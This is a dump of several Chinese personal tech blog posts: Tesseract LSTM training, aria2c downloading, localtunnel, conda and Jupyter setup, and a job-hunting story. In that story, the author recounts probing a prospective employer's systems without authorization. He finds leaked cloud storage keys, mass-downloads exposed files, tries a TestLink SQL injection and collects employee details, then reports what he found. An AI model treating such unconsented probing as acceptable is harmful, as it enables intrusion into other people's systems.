class=\"comment\">#明显看出要比传统训练少了不少步骤(自己操作的步骤)，其实脚本帮你做了。其中根据vgslspec语法，你可以修改网络层。训练的时候，会自动保存许多不同错误率的lstm文件，然后留待下一步选择一个合并就行了。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>step 4: 评估你训练的模型</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ lstmeval --model ./trainlayer/_checkpoint --eval_listfile ./chitrain/chi_sim.training_files.txt  </span><br><span class=\"line\">$ lstmeval --model ./chi_sim.lstm --eval_listfile ./tesseract-ocr/chieval/chi_sim.training_files.txt</span><br><span class=\"line\"><span class=\"comment\">#从这里看出来，既可以使用checkpoint也可以使用现有的lstm模型去验证</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>step 5: 合并新的字库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">combine_tessdata -o ./chi_sim.traineddata \\</span><br><span class=\"line\">  xxxx.lstm \\</span><br><span class=\"line\">  ./chitrain/chi_sim.lstm-number-dawg \\</span><br><span class=\"line\">  ./chitrain/chi_sim.lstm-punc-dawg \\</span><br><span class=\"line\">  ./chitrain/chi_sim.lstm-word-dawg</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>合并后的字库后将其移动到tesseract的默认字库文件夹，便可以使用其进行识别了。</p>\n<font color=\"red\"> 注意事项 </font>\n\n<ul>\n<li>获取字体名称 ，可以通过 <code>fc-list :lang=zh</code> 来查找/usr/share/fonts/下面的字体,然后经过一些列<code>awk,sed</code>得到需要的字体名，将其添加到<code>tesseract/training/languange-specific.sh</code>里</li>\n<li>更好的方式是使用 <code>text2image --fonts_dir /usr/share/fonts/ch_2000/ --list_available_fonts</code>，这样就可以直接列出所有该目录下的字体文件名，但是需要注意的是依旧有不存在的，结果并不是完全正确的。</li>\n<li>在<code>languange-specific</code>中更改时一定要注意<code>&quot;\\</code>是不对的，应该是<code>&quot; \\</code></li>\n<li>生成训练数据时一旦有一个错误出现就不会输出到相应的文件夹，但是可以根据记录到<code>/tmp/tmp.</code>下找到临时生成的文件，如果你不想或者不需要那么多，可以直接拷贝这些文件即可。但是这些文件时不完整的，所以你必须删除这些不存在的字体，使用<code>tesstrain.sh --fonts_dir /usr/share/fonts/ch_2000/ --lang chi_sim --linedata_only   --noextract_font_properties --langdata_dir /home/langdata --output_dir /home/lstmtest/400type/chitrain | grep &quot;ERROR&quot;</code>找到Error的字体，多运行几次删除干净即可。注意我这句没有指定<code>tessdata_dir</code>,是因为我把他放在了系统变量。你也可以使用<code>export TESSDATA_PREFIX=/home/lstmtest/tessdata</code>进行指定自己的位置</li>\n</ul>\n<font color=\"green\"> 补充 </font>\n\n<ul>\n<li>至于不像普通训练那么费事，是因为封装到脚本里了，可以自己看下。同时之所以不需要自己生成训练图片是因为在<code>tessdata</code>里提供了一个中文的字体和单词列表，通过字体文件直接进行生成，详细阅读相应的<code>shell</code>脚本</li>\n<li>经过训练同一种字体的不同形态会产生明显的收敛效果，但是不是同一种的就不行，或者说效果不好。</li>\n<li>同样，你不再需要像传统训练时，添加自定义单词。在特定领域的话，也可以添加一下(哭笑不得)。因为训练的时候，有两种错误率，一种是单字错误率，一种是单词错误率。但也不是下降的越低越好。通常增加训练的迭代次数，会降低错误率。但是这个错误率下的模型可能在会将字体识别正确的同时，将标点识别错误了。</li>\n<li>合并后，后面带<em>tmp</em>的是原字库文件。我们可以把不同<code>checkpoint</code>下的<code>lstm</code>模型进行合并，类似于这样</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.profile</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> `ls ./lstmfile/*.lstm` </span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tfilename=`<span class=\"built_in\">echo</span> <span class=\"variable\">$file</span> | awk -F <span class=\"string\">'/'</span> <span class=\"string\">'&#123;print $3&#125;'</span> | awk -F <span class=\"string\">'_'</span> <span class=\"string\">'&#123;print $1&#125;'</span>`</span><br><span class=\"line\"></span><br><span class=\"line\">\tcombine_tessdata -o ./chi_sim.traineddata \\</span><br><span class=\"line\">\t  <span class=\"variable\">$file</span> \\</span><br><span class=\"line\">\t  ./chitrain/chi_sim.lstm-number-dawg \\</span><br><span class=\"line\">\t  ./chitrain/chi_sim.lstm-punc-dawg \\</span><br><span class=\"line\">\t  ./chitrain/chi_sim.lstm-word-dawg</span><br><span class=\"line\"></span><br><span class=\"line\">mv chi_sim.traineddata <span class=\"variable\">$filename</span>.traineddata</span><br><span class=\"line\">mv chi_sim.traineddata.__tmp__ chi_sim.traineddata</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>最后，这是我从服务器上下载下来的数据，选择了3个较低错误率的数据库下载了下来。前面的数字是错误率。<br><img src=\"/images//Tesseract/lstm_02.png\" alt=\"lstm_result\"></p>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://github.com/tesseract-ocr/tesseract/wiki/Technical-Documentation\" target=\"_blank\" rel=\"noopener\">Tesseract Documention</a></li>\n<li><a href=\"http://colah.github.io/posts/2015-08-Understanding-LSTMs\" target=\"_blank\" rel=\"noopener\">Understanding LSTM </a></li>\n</ul>\n","categories":["HowTo"],"tags":["知识回顾","学习笔记"]},{"title":"百度云盘下载的套路","url":"http://iami.xyz/2017/06/16/Review-S06-Baiduyun-download-Taolu/","content":"<h4 id=\"前言-都是套路\"><a href=\"#前言-都是套路\" class=\"headerlink\" title=\"前言: 都是套路\"></a>前言: 都是套路</h4><p>你一定也是烦的不行不行的，下载百度云限速不说，还不能在linux服务器上搞，下面就介绍下如何在Linux服务器上下载文件，并能突破速度限制。</p>\n<ul>\n<li><a href=\"https://github.com/houtianze/bypy\" target=\"_blank\" rel=\"noopener\">客户端bypy</a></li>\n<li><a href=\"https://github.com/acgotaku/BaiduExporter\" target=\"_blank\" rel=\"noopener\">链接导出助手</a></li>\n</ul>\n<p>出于简便我选择了链接导出，下载下来之后加载插件到<code>chrome</code>，然后导出链接并使用<code>aira2c</code>下载。 aria2c还有web管理界面，使用起来更方便。而且其中一个是<code>pyspider</code>的作者开发的，<code>binux</code>简直太厉害了。</p>\n<ul>\n<li>step1:</li>\n</ul>\n<p><img src=\"/images//BaiduExport/01.png\" alt=\"export\"></p>\n<ul>\n<li>step2</li>\n</ul>\n<p><img src=\"/images//BaiduExport/02.png\" alt=\"get_link\"></p>\n<ul>\n<li>step3 </li>\n</ul>\n<p><img src=\"/images//BaiduExport/03.png\" alt=\"download\"></p>\n<p>step1,2,3略显白痴，小技巧就是拿到链接放在aria2c时批量下载记得在每个下载后面加<code>&amp;</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#下载磁力链接</span></span><br><span class=\"line\">$ aria2c <span class=\"string\">\"magnet:?xt=urn:btih:dhsudfhisudhfuidshfisdhfiusdhfsdhiufh&amp;dn=aria2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#打印种子内的内容</span></span><br><span class=\"line\">$ aria2c -S file.torrent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#使用代理</span></span><br><span class=\"line\">$ aria2c --all-proxy=<span class=\"string\">'http://127.0.0.1:8080'</span> http://host/file</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#下载完成后执行某条命令。</span></span><br><span class=\"line\">$ aria2c --on-download-complete=COMMAND http://example.org/file.iso</span><br></pre></td></tr></table></figure>\n<p>其实<code>aria2c</code>有许多高级的玩法，比<code>wget</code>快的多，多线程，可以直接解析磁力链和种子。可以根据官网的信息接着玩。有空接着补。</p>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://aria2.github.io/\" target=\"_blank\" rel=\"noopener\">Aria2c</a></li>\n<li><a href=\"http://sydi.org/posts/linux/aria2c-usage-sample-cns.html\" target=\"_blank\" rel=\"noopener\">Aria2c使用举例</a></li>\n</ul>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"算是比较有意思的事情吧","url":"http://iami.xyz/2017/06/15/Review-S04-Interview-or-not/","content":"<h4 id=\"前言：没有前言\"><a href=\"#前言：没有前言\" class=\"headerlink\" title=\"前言：没有前言\"></a>前言：没有前言</h4><p>其实是因为今天去看一家网站的时候，想起了发生的故事。想想从5月27早上到上海，到31号开始搬到学长这边。结果6.1还去面了一次试。然后3号决定从原公司辞职，却在4号算是得到了长沙那边的认可。然后，觉得不靠谱，喊上一个同学，跑了一趟长沙看看。总之呢，按照道理来讲，状态不好的时候，不要瞎做决定。否则只会更糟糕。不过，不糟糕一下，你怎么知道是不是最糟的呢。<br>本来这个博客下面是只更新技术的，不应该把这个放在里面。但是我想想，这里面其实包含了一部分的技巧…</p>\n<h4 id=\"正文-一：这tm像个故事一样\"><a href=\"#正文-一：这tm像个故事一样\" class=\"headerlink\" title=\"正文 一：这tm像个故事一样\"></a>正文 一：这tm像个故事一样</h4><p>雨从五月下到六月，从合肥下到上海，伴着腿疼和身心疲惫。倒霉的运气也始终不离不弃的跟着我。31号那天在下雨，我记得很清楚，因为没有带伞。仓皇的搬到学长这边住下，虽不像张爱玲小说里面描写的那么唯唯诺诺，谨慎小心。但寄人篱下总是使我心中有所不安。还好，学长即是学长又是朋友。也难得，4月到5月这段难捱的日子有几位朋友相伴。<br>说来也是神奇，长沙的工作是一个玩CTF群(我并不怎么玩CTF)里的表哥(不知道最初源于何处，现在对搞安全的都是喊表哥表姐表弟…)说长沙有家研究院招人，是挂在公安部，直接听命什么什么的，十分厉害就是了。然后最初我是没有去的，那是还想为当时实习所在的公司效力一把吧。毕竟待我不薄。后来过了大概一个多星期吧，自己被分手了(一段美好而又短暂的时光)。就不想回原来这家公司了，问问暗夜表哥，表哥说长沙研究院那边已经不招了。然而，缘，妙不可言。过了几周之后，又开始招人了。投了份简历过去，然后就等面试了，这样一直等啊等等到了6月份(因为面试官一直在北京，没有回长沙)。</p>\n<h4 id=\"正文-二：缘起灵兮\"><a href=\"#正文-二：缘起灵兮\" class=\"headerlink\" title=\"正文 二：缘起灵兮\"></a>正文 二：缘起灵兮</h4><p>话从另外一边说起，31号投的简历。当时没想到那么快，周日投的，周一就接到了电话面试。当时接到电话的时候，还以为是办款带的。后来对方(昌振兄)说自己是灵兮的，我才匆忙搁下水果，擦擦嘴开始面试。面试就这样开始了，最初我的打算是手里拿三个方向的offer就行了，一个安全，一个爬虫，再来一个初级图像处理，当时，算是只有一个爬虫的。和昌振兄聊起来之后，问的很仔细，就这简历上做过的东西一点一点的捋。当然最后发现我的数学功底并不够，没办法，看来连初级也拿不到了。然后聊得开了，大家就又谈起其他的一些事情。后来挂了电话，准备吃点水果睡个午觉的时候，又突然接到了昌振兄的电话，他说他帮我推荐了另外的职位，想让我去面试一下。约的3点，没有吃午饭，转了2条线的地铁，骑了摩拜，最终花了1个半小时，准时到地方。在办公室里看了会书，就有人来面试了，从3点聊到5点半还是6点来着，还算不错，顺带帮面试官提供了几个解决问题的小思路。后来就等这家公司消息了。就在我午饭没吃，从11点顶到6点之后的某一天，打开拉勾，看到了杯具了。标注的其实挺离谱，直接从待沟通标了不合适。不过无论成不成，起码认识了昌振兄这个人，我觉得很值得，很开心。<br>道别海知，在2号时码了一些字，发给了CTO和技术总监。总监是带我的，我们聊了会，他起初不信，后来说了原因，互道了珍重，祝好。说随时欢迎回去，让我先去调整一段时间心态。CTO老丁说，少年多出去看看世界，哈哈。是的，然后我就听了他们的去了长沙看看。</p>\n<h4 id=\"正文-三：真假研究院\"><a href=\"#正文-三：真假研究院\" class=\"headerlink\" title=\"正文 三：真假研究院\"></a>正文 三：真假研究院</h4><p>那边面试后，这边每天和长沙的聊聊天。最后一个晚上电话面了下。算是通过了，这时候算是手里有了两个方向的offer了，一个爬虫，一个安全。<br>然而出于谨慎，以及对方回答问题有所回避。使我觉得不知真假。比如说你问公司地址在哪，他一直回避，只是说等你到了长沙南站派车接你。这样你怎么放心的下。后来也是，去了长沙之后，也是不愿意告诉我地址。只是说去了就准备入职了。实在让人生疑，中间官网还挂了一次。去收集这家公司的信息，主要成员的信息又收集不到太多。最终决定亲自去看一看，一探究竟。那是我已经喊了一个朋友陪我一起去的长沙，就为了有个照应，怕出意外。做的计划也算是周到详尽，运用我能想到的一切方法，收集打探消息。最后住下酒店后，晚上终于得到研究院地址，而收集到的消息是那里一个传销重镇，顿时心中一凉。</p>\n<blockquote>\n<p>我做了这些准备。</p>\n</blockquote>\n<ul>\n<li>写了个脚本，实时获取自己手机的gps位置。</li>\n<li>打乱对方计划。对方要去接你，你就提前或落后。一定要错开，提前入住，然后查看周边地形。</li>\n<li>计算出精准的时间，结合自己的体能。</li>\n<li>和朋友保持联系，约定好暗号。 </li>\n<li>想出特殊的传递消息的方法。例如，暗号之后的话，每句话第几个字是信号。隔几个选一个。别比比，哪有桂花现在开的，我不原谅你。 虽然比桂原不是碧桂园，但是只要不傻，打听下就知道了。</li>\n<li>转少量急用到支付宝，解绑支付宝银行卡，删除银行通知短信。</li>\n<li>不要带任何证件前往</li>\n<li>使用第二张电话卡通话</li>\n<li>和你的朋友分开前去，打两辆车。先后到，然后就看你朋友给不给力了，伪装成陌生人。</li>\n<li>学一些格斗术。 由于我本人上过几年的散打(体育课)，加上经常锻炼。所以又复习了下一些格斗术。</li>\n<li>心理学的反洗脑术(并不会)，但是可以种最简单的心锚(高中看到的，这个最简单也最有用)。</li>\n<li>冷静冷静冷静冷静，这个最重要。</li>\n</ul>\n<p>那天，我去前。发现卫星地图上显示的都是密密麻麻的屋子。约得是第二天9点见面，早上早早去了。5点钟起床，6点左右到的地方。进了小区门之后开始计算，步行需要1分04秒，从另一边步行出去需要1分零15秒。当时发现这是在一片别墅区，可能使我降低了一定的警惕。然后朋友在后面若即若离，到门口，发现公司所处的别墅和别的都不一样，这家是铁皮门，墙头加了电网(应该是)，从外面几乎看不到里面的任何场景。就更加生疑了。然后趁着这段时间把整个别墅区骑摩拜逛了一下，算好最快逃跑的路线，怎么从长沙县打的返回长沙市。最后，虽然是我多虑了，但是还是很有价值的一次经验吧。<br>公司是挺好的，小别墅有两层，里面有健身房游泳池。而且据说最近打算搬到自己的地上。办公环境我也十分喜欢，高配的设备，轻松的环境，二楼据说是公安某警种设备研发处。看着无人机，3d打印机，以及许多好玩的，还有聊天谈到了一些套路，知道自己比较喜欢这里了。想留下。<br>后来在长沙玩了一下，长沙真是个玩乐的好地方，那几天我在长沙玩，每天累成狗，回来睡得可香了。。我还在开福寺的后院拆迁废墟里捡了一本《觉悟之路》，目前看了一半了。发现上座部佛教和我的想法一致，很符合。和我之前只读佛经不一样，这个从大体上描述并定义了佛教。实乃经典之作。</p>\n<h4 id=\"正文-四：今天和灵兮\"><a href=\"#正文-四：今天和灵兮\" class=\"headerlink\" title=\"正文 四：今天和灵兮\"></a>正文 四：今天和灵兮</h4><p>后来确定了想去长沙，也就没怎么再关注灵兮了。只是打算投投简历，再收集个图像处理初级的offer得了。可是我妈是不同意去长沙的。怕被骗，一直是不放心…外加亲友也没有赞成的。几个交心好友也不赞成，那时我已经打算去拼一把了。然而，但是一个朋友说了一句话，就是”买卖不成仁义在，大家生意可以做不成，但一定要坦诚是吧。你这对方很多信息都不给你介绍，不讲仁义。”后来又想想，我妈就我自己，我走了，她怎么办。之后又经历了几个夜晚的纠结。还是决定继续在上海找工作。<br>然后，就是昨天今天和昌振兄聊天，发现实乃博学君子，温恭谦良之辈。我们讨论了一些问题后。出于我自己想去了解一下这家公司，就去看了看，最后发现</p>\n<ul>\n<li>公司github aliyun OSS秘钥泄露(其实已经是7个月前了)</li>\n<li>OSS配置不当，导致文件可直接下载</li>\n<li>Testlink 1.9.14 sql 注入漏洞。(这个之前没接触过，习惯性Google了下testlink的漏洞，然后试着注了下)</li>\n<li>Testlink目录配置不当</li>\n<li>在process on收集到公司其他一些员工的信息，还可以进一步结合社工收集，不过累了没有去查了。毕竟没睡午觉很困了。</li>\n<li>其实还有一些其他端口，不知道开放了什么服务，不过看样子是自己写的torndao服务，估计有迹可循，但是也没看。</li>\n</ul>\n<p>下午告诉了昌振兄，让他赶紧改key,id。毕竟公司一大部分重要资料都在里面(我也顺便学习了一下OSS的使用)，又聊了会，睡了个觉。聊了一会。其实这暴露了一个问题，就是公司安全意识不高。同时昌振兄还告诉我说那个testlink的服务其实是不用了，当初只是为了测试一下部署上去的。但是，殊不知，这种情况往往给别人可乘之机。还有就是防火墙好像没有对异常流量做检验？最开始时配合用gevent配合下载文件时，请求频率那么高，竟然都没有禁止，也是奇怪了。</p>\n<h4 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h4><p>《觉悟之路》里面否定了神的存在，说明了不应该通过祈祷，而是应该放下执念以一种不屈不挠的精神去面对世间的沧桑百态。我又想起了学诚法师讲的随缘，所谓随缘是指做好一切相应的准备，在缘分到来之时，以一种不卑不亢的态度应对劫数，之后也不患得患失。这和我之前理解的随缘有所差异，现在看来是自己浅薄了。没能悟到其中做好应的准备。</p>\n<h4 id=\"吐槽\"><a href=\"#吐槽\" class=\"headerlink\" title=\"吐槽\"></a>吐槽</h4><ul>\n<li>长沙如家莫泰的打扫真是不干净，以后又涨了许多其他的记性。</li>\n<li>滴滴垄断后，打车平台有一种任其鱼肉的感觉，对于共享单车也是，摩拜又难骑，又不灵活，长沙骑了几次都是显示骑行中，其实根本没解锁，艹。</li>\n<li>春秋航空把廉价机票的另外一部分费用放在了飞机商品推广，以及降低服务质量。上机后眯了一会，醒了有点冷，要了个毯子，喊了两次，到下机都没人给我送来。艹。</li>\n</ul>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"locatunnel的使用回顾","url":"http://iami.xyz/2017/06/14/Review-S01-localtunnel/","content":"<h4 id=\"前言：\"><a href=\"#前言：\" class=\"headerlink\" title=\"前言：\"></a>前言：</h4><p>很久没有更新技术了，主要是因为一直在学习新的知识吧。这边刚结束，那边又开始去搞毕业设计了。而出于个人感情原因，自己又从原公司离职了。虽然拿了一家研究院的安全offer，但是老妈觉得长沙太远。然后呢，问了10个朋友，8：2是不让去的，只有两个说让我去。没办法，先找找工作吧， 一边找工作，一边更新下这大半年的积累。边想边更，不一定是按照时间序列的。</p>\n<h4 id=\"正文：穿越内网的http服务\"><a href=\"#正文：穿越内网的http服务\" class=\"headerlink\" title=\"正文：穿越内网的http服务\"></a>正文：穿越内网的http服务</h4><p>当你在内网的时候想把内网的一个web展示，或者说临时展示出去的时候，又不想那么麻烦的搭建一个web服务器之类的，而是希望直接在本机上展示出去，那么这个时候，就可以使用localtunnel了。(ps:前提是你已经安装了nodejs)</p>\n<p>只需要采用 <code>npm install -g localtunnel</code>进行安装，然后使用<code>lt --port 80</code>即可进行转发，运行命令后<code>localtunnel</code>服务器会返回一个网址的。可谓十分方便，当然我们不能只介绍这么一点玩法，下面看其他有趣的玩法(强行凑博客感)。</p>\n<ul>\n<li><p>搭建自己的<code>localtunnel</code>服务器，以便提升访问速度。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> git://github.com/defunctzombie/localtunnel-server.git</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> localtunnel-server</span><br><span class=\"line\">$ npm install</span><br><span class=\"line\"></span><br><span class=\"line\">$ bin/server --port 1234</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>lt命令的其他用法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ lt --host http://yourserver:1234 --port 5000 -s prefix</span><br><span class=\"line\"><span class=\"comment\">#这个就以为着转发本机5000端口到服务器yourserver上，然后获取域名为prefix.youserver:1234，可以通过该域名进行访问。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://github.com/localtunnel/localtunnel\" target=\"_blank\" rel=\"noopener\">localtunnel</a></li>\n<li><a href=\"https://github.com/localtunnel/server\" target=\"_blank\" rel=\"noopener\">localtunnel-server</a></li>\n</ul>\n","categories":["HowTo"],"tags":["知识回顾","学习笔记"]},{"title":"conda in action","url":"http://iami.xyz/2017/06/14/Review-S02-conda-my-useage/","content":"<p>无论是使用virtualenv还是conda，本意无非是使开发环境变得干净纯粹，当然我们还可以使用<code>vagrant</code>启动一个虚拟机，在虚拟机里操作，或者<code>docker</code>起一个<code>container</code>也一样。</p>\n<ul>\n<li><p>基础的用法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda info --env</span><br><span class=\"line\">$ conda create -n testenv</span><br><span class=\"line\">$ activate testenv</span><br><span class=\"line\">$ deactivate testenv</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在<code>linux</code>下你可能需要这样</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">source</span> activate testenv</span><br><span class=\"line\">$ <span class=\"built_in\">source</span> deactivate testenv</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>指定<code>python</code>版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda create -n testenv python=27</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除某个虚拟环境</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda env remove --name tensorflow</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使<code>jupyter</code>使用某个虚拟环境</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">source</span> activate myenv</span><br><span class=\"line\">$ python -m ipykernel install --user --name myenv --display-name <span class=\"string\">\"Python (myenv)\"</span></span><br><span class=\"line\">$ <span class=\"built_in\">source</span> activate other-env</span><br><span class=\"line\">$ python -m ipykernel install --user --name other-env --display-name <span class=\"string\">\"Python (other-env)\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在服务器上启动一个无浏览器的<code>jupyter notebook</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ jupyter notebook --no-browser</span><br><span class=\"line\">$ jupyter notebook --no-browser --port 6699</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>集成<code>pyspark</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#step 1 </span></span><br><span class=\"line\">$ mv spark-1.2.0-bin-hadoop2.4 /opt/spark-1.2.0</span><br><span class=\"line\">$ ln -s /opt/spark-1.2.0 /opt/spark</span><br><span class=\"line\"><span class=\"comment\">#step 2 (长久生效应该将下列的语句写到bashrc文件里，或者zshrc里)</span></span><br><span class=\"line\">$ <span class=\"built_in\">export</span> SPARK_HOME=/opt/spark</span><br><span class=\"line\">$ <span class=\"built_in\">export</span> PATH=<span class=\"variable\">$SPARK_HOME</span>/bin:<span class=\"variable\">$PATH</span></span><br><span class=\"line\">$ <span class=\"built_in\">export</span> PYSPARK_DRIVER_PYTHON=jupyter</span><br><span class=\"line\">$ <span class=\"built_in\">export</span> PYSPARK_DRIVER_PYTHON_OPTS=<span class=\"string\">'notebook'</span></span><br><span class=\"line\"><span class=\"comment\">#step 3 </span></span><br><span class=\"line\">$ pyspark</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>集成 <code>R</code></p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; install.packages(c(<span class=\"string\">'repr'</span>, <span class=\"string\">'IRdisplay'</span>, <span class=\"string\">'evaluate'</span>, <span class=\"string\">'crayon'</span>, <span class=\"string\">'pbdZMQ'</span>, <span class=\"string\">'devtools'</span>, <span class=\"string\">'uuid'</span>, <span class=\"string\">'digest'</span>))</span><br><span class=\"line\">devtools::install_github(<span class=\"string\">'IRkernel/IRkernel'</span>)</span><br><span class=\"line\">&gt; IRkernel::installspec()</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<blockquote>\n<p>当然，docker似乎已经成了更加方便的部署方法，可我觉得哪里缺了点什么。这些东西一定要自己先手动部署一次。之后再使用也知道是个怎么回事了。</p>\n</blockquote>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://blog.sicara.com/get-started-pyspark-jupyter-guide-tutorial-ae2fe84f594f\" target=\"_blank\" rel=\"noopener\">pyspark-with-jupyter</a></li>\n<li><a href=\"https://github.com/jupyter/docker-stacks/tree/master/pyspark-notebook\" target=\"_blank\" rel=\"noopener\">docker-pyspakr-jupyter</a></li>\n<li><a href=\"https://github.com/IRkernel/IRkernel\" target=\"_blank\" rel=\"noopener\">IRkernel</a></li>\n</ul>\n","categories":["HowTo"],"tags":["知识回顾","学习笔记"]},{"title":"浅谈代码安全及安全","url":"http://iami.xyz/2016/12/17/Just-Taking-about-code-security/","content":"<h4 id=\"题记：写在浅谈代码安全之前\"><a href=\"#题记：写在浅谈代码安全之前\" class=\"headerlink\" title=\"题记：写在浅谈代码安全之前\"></a>题记：写在浅谈代码安全之前</h4><p>业余看代码之前，对公司的一些产品进行了简单的安全测试。其实那些真正牛逼的人都是脾气好又低调的很啊，佩服佩服，努力学习，向你们看齐↖(^ω^)↗ 。别人送了一张FIT的票，好开心啊，谢谢Black_hole大表哥。现在终于理解别人去看演唱会的那种激动了，小菜鸟成长ING</p>\n<h4 id=\"正文：浅谈代码安全以及其他\"><a href=\"#正文：浅谈代码安全以及其他\" class=\"headerlink\" title=\"正文：浅谈代码安全以及其他\"></a>正文：浅谈代码安全以及其他</h4><p>代码安全毋庸置疑是什么重要的，从安全角度来说，如果说除了安全问题。运维之外，那么首个应该负责的人就是主程。再假如一个主程没有丝毫的安全概念，那写出来的代码健壮性可想而知。这样下去，在我看来，10年8年的成长也不过仅仅是一些经验的积累，或许还有一些其他的东西，不过我是看不到了。</p>\n<p>首先:</p>\n<ol>\n<li><p>意识很重要 x 1</p>\n</li>\n<li><p>安全知识很重要 x 2</p>\n</li>\n<li><p>代码规范很重要 x 3</p>\n</li>\n<li><p>架构设计和代码审查很重要 